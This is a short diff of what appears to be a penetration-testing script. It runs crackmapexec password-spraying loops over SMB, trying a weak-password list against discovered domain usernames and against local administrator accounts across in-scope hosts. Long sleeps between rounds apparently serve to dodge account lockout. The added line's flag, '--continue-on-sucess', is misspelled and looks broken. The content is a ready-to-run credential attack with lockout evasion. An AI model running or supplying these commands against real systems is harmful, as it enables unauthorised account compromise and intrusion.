@@ -26,5 +26,5 @@ pause
 for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i; echo $i; sleep 35m; done 
 
 ##local auth
-for i in $(cat ~/lists/weak_passwords.txt); do crackmapexec smb ~/scope.txt --local-auth -u administrator -p $i; echo sleeping; t=1800;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
+for i in $(cat ~/lists/weak_passwords.txt); do crackmapexec smb ~/scope.txt --local-auth -u administrator -p $i --continue-on-sucess; echo sleeping; t=1800;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done
 
